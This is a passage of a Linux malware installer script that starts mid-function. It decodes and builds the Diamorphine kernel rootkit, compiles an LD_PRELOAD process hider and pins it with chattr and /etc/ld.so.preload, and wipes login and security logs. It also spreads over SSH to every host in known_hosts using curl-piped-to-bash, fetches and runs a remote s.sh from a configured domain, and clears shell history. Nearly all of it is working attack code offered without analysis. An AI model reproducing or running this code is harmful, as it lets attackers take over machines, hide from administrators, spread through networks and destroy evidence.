  hf='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'
  echo $hf|base64 -d >$hi_home/hf.tar
  tar -xf $hi_home/hf.tar -C $hi_home/
  cd $hi_home/ 
  make
      if [ -f "$hi_home/diamorphine.ko" ]
      then 
       insmod diamorphine.ko
      else
      echo "dia hide false"
      fi
else
  echo "other hide method"
fi
}

exec_hide(){
hi_home=/usr/share/...
if [ -f "$hi_home/diamorphine.ko" ]
then 
   echo "diamorphine loaded1"
   echo "hide diamorphine1"
   exec_f
else
    echo "diamorphine not loaded,execute load process"
    hide_f
    exec_f 
fi
}

localgo() {
echo > /var/spool/mail/root
echo > /var/log/wtmp
echo > /var/log/secure
if [ -f /root/.ssh/known_hosts ] && [ -f /root/.ssh/id_rsa.pub ]; then
  for h in $(grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" /root/.ssh/known_hosts); do ssh -oBatchMode=yes -oConnectTimeout=5 -oStrictHostKeyChecking=no $h 'curl -o-  ${mainurl/b.sh} | bash >/dev/null 2>&1 &' & done
fi
}
exec_hide2(){
BINARY_NAME="md"
H2P=${MOHOME}/..lph
if [ "$UID" = "0" ];then
LHB_MAKE='YWxsOiBsaWJwcm9jZXNzaGlkZXIuc28KCmxpYnByb2Nlc3NoaWRlci5zbzogcHJvY2Vzc2hpZGVyLmMKCWdjYyAtV2FsbCAtZlBJQyAtc2hhcmVkIC1vIGxpYnByb2Nlc3NoaWRlci5zbyBwcm9jZXNzaGlkZXIuYyAtbGRsCgouUEhPTlkgY2xlYW46CglybSAtZiBsaWJwcm9jZXNzaGlkZXIuc28KCg=='
PROCHIDE='I2RlZmluZSBfR05VX1NPVVJDRQoKI2luY2x1ZGUgPHN0ZGlvLmg+CiNpbmNsdWRlIDxkbGZjbi5oPgojaW5jbHVkZSA8ZGlyZW50Lmg+CiNpbmNsdWRlIDxzdHJpbmcuaD4KI2luY2x1ZGUgPHVuaXN0ZC5oPgoKLyoKICogRXZlcnkgcHJvY2VzcyB3aXRoIHRoaXMgbmFtZSB3aWxsIGJlIGV4Y2x1ZGVkCiAqLwpzdGF0aWMgY29uc3QgY2hhciogcHJvY2Vzc190b19maWx0ZXIgPSAiW21kXSI7CgovKgogKiBHZXQgYSBkaXJlY3RvcnkgbmFtZSBnaXZlbiBhIERJUiogaGFuZGxlCiAqLwpzdGF0aWMgaW50IGdldF9kaXJfbmFtZShESVIqIGRpcnAsIGNoYXIqIGJ1Ziwgc2l6ZV90IHNpemUpCnsKICAgIGludCBmZCA9IGRpcmZkKGRpcnApOwogICAgaWYoZmQgPT0gLTEpIHsKICAgICAgICByZXR1cm4gMDsKICAgIH0KCiAgICBjaGFyIHRtcFs2NF07CiAgICBzbnByaW50Zih0bXAsIHNpemVvZih0bXApLCAiL3Byb2Mvc2VsZi9mZC8lZCIsIGZkKTsKICAgIHNzaXplX3QgcmV0ID0gcmVhZGxpbmsodG1wLCBidWYsIHNpemUpOwogICAgaWYocmV0ID09IC0xKSB7CiAgICAgICAgcmV0dXJuIDA7CiAgICB9CgogICAgYnVmW3JldF0gPSAwOwogICAgcmV0dXJuIDE7Cn0KCi8qCiAqIEdldCBhIHByb2Nlc3MgbmFtZSBnaXZlbiBpdHMgcGlkCiAqLwpzdGF0aWMgaW50IGdldF9wcm9jZXNzX25hbWUoY2hhciogcGlkLCBjaGFyKiBidWYpCnsKICAgIGlmKHN0cnNwbihwaWQsICIwMTIzNDU2Nzg5IikgIT0gc3RybGVuKHBpZCkpIHsKICAgICAgICByZXR1cm4gMDsKICAgIH0KCiAgICBjaGFyIHRtcFsyNTZdOwogICAgc25wcmludGYodG1wLCBzaXplb2YodG1wKSwgIi9wcm9jLyVzL3N0YXQiLCBwaWQpOwogCiAgICBGSUxFKiBmID0gZm9wZW4odG1wLCAiciIpOwogICAgaWYoZiA9PSBOVUxMKSB7CiAgICAgICAgcmV0dXJuIDA7CiAgICB9CgogICAgaWYoZmdldHModG1wLCBzaXplb2YodG1wKSwgZikgPT0gTlVMTCkgewogICAgICAgIGZjbG9zZShmKTsKICAgICAgICByZXR1cm4gMDsKICAgIH0KCiAgICBmY2xvc2UoZik7CgogICAgaW50IHVudXNlZDsKICAgIHNzY2FuZih0bXAsICIlZCAoJVteKV1zIiwgJnVudXNlZCwgYnVmKTsKICAgIHJldHVybiAxOwp9CgojZGVmaW5lIERFQ0xBUkVfUkVBRERJUihkaXJlbnQsIHJlYWRkaXIpICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBcCnN0YXRpYyBzdHJ1Y3QgZGlyZW50KiAoKm9yaWdpbmFsXyMjcmVhZGRpcikoRElSKikgPSBOVUxMOyAgICAgICAgICAgICAgIFwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgXApzdHJ1Y3QgZGlyZW50KiByZWFkZGlyKERJUiAqZGlycCkgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBcCnsgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFwKICAgIGlmKG9yaWdpbmFsXyMjcmVhZGRpciA9PSBOVUxMKSB7ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgXAogICAgICAgIG9yaWdpbmFsXyMjcmVhZGRpciA9IGRsc3ltKFJUTERfTkVYVCwgI3JlYWRkaXIpOyAgICAgICAgICAgICAgIFwKICAgICAgICBpZihvcmlnaW5hbF8jI3JlYWRkaXIgPT0gTlVMTCkgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgXAogICAgICAgIHsgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBcCiAgICAgICAgICAgIGZwcmludGYoc3RkZXJyLCAiRXJyb3IgaW4gZGxzeW06ICVzXG4iLCBkbGVycm9yKCkpOyAgICAgICAgIFwKICAgICAgICB9ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgXAogICAgfSAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBcCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFwKICAgIHN0cnVjdCBkaXJlbnQqIGRpcjsgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgXAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBcCiAgICB3aGlsZSgxKSAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFwKICAgIHsgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgXAogICAgICAgIGRpciA9IG9yaWdpbmFsXyMjcmVhZGRpcihkaXJwKTsgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBcCiAgICAgICAgaWYoZGlyKSB7ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFwKICAgICAgICAgICAgY2hhciBkaXJfbmFtZVsyNTZdOyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgXAogICAgICAgICAgICBjaGFyIHByb2Nlc3NfbmFtZVsyNTZdOyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBcCiAgICAgICAgICAgIGlmKGdldF9kaXJfbmFtZShkaXJwLCBkaXJfbmFtZSwgc2l6ZW9mKGRpcl9uYW1lKSkgJiYgICAgICAgIFwKICAgICAgICAgICAgICAgIHN0cmNtcChkaXJfbmFtZSwgIi9wcm9jIikgPT0gMCAmJiAgICAgICAgICAgICAgICAgICAgICAgXAogICAgICAgICAgICAgICAgZ2V0X3Byb2Nlc3NfbmFtZShkaXItPmRfbmFtZSwgcHJvY2Vzc19uYW1lKSAmJiAgICAgICAgICBcCiAgICAgICAgICAgICAgICBzdHJjbXAocHJvY2Vzc19uYW1lLCBwcm9jZXNzX3RvX2ZpbHRlcikgPT0gMCkgeyAgICAgICAgIFwKICAgICAgICAgICAgICAgIGNvbnRpbnVlOyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgXAogICAgICAgICAgICB9ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBcCiAgICAgICAgfSAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFwKICAgICAgICBicmVhazsgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgXAogICAgfSAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBcCiAgICByZXR1cm4gZGlyOyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFwKfQoKREVDTEFSRV9SRUFERElSKGRpcmVudDY0LCByZWFkZGlyNjQpOwpERUNMQVJFX1JFQURESVIoZGlyZW50LCByZWFkZGlyKTsKCg=='
mkdir -p ${H2P} 2>/dev/null
echo $LHB_MAKE | base64 -d > ${H2P}/Makefile
echo $PROCHIDE | base64 -d > ${H2P}/processhider.c
cd ${H2P}
make 2>/dev/null 1>/dev/null
${CHATTR} -ia / /etc/ /etc/ld.so.preload /usr/ /usr/local/ /usr/local/lib/ 2>/dev/null 1>/dev/null
cp ${H2P}/libprocesshider.so /usr/local/lib/$BINARY_NAME.so 2>/dev/null
#rm -fr ${H2P} 2>/dev/null 1>/dev/null
${CHATTR} +i /usr/local/lib/$BINARY_NAME.so
if [ ! -f "/etc/ld.so.preload" ]; then touch /etc/ld.so.preload; fi
if [ -f /usr/local/lib/$BINARY_NAME.so ]; then cat /etc/ld.so.preload 2>/dev/null 1>/dev/null | grep '/usr/local/lib/'$BINARY_NAME'.so' || echo '/usr/local/lib/'$BINARY_NAME'.so' >> /etc/ld.so.preload;fi
${CHATTR} +i /etc/ld.so.preload 
fi
}

exe_remo(){
if [ ! -f "/var/tmp/.kalaf" ]; then
localgo
echo 'lockfile' > /var/tmp/.kalaf
sleep 10
${CURL_CMD} -fsSL http://${domain}/s.sh | sh 
${CHATTR} +i /var/tmp/.kalaf
history -c
else
  echo "replay .. i know this server ..."
fi 
echo "[*] Setup complete"  
history -c
}
check_exist
m_command
ins_package
check_exist
SetupNameServers
download_f
setup_s
makesshaxx
clean_monitor
clean_cron
lock_cron
exec_hide
exec_hide2
clmo
exe_remo
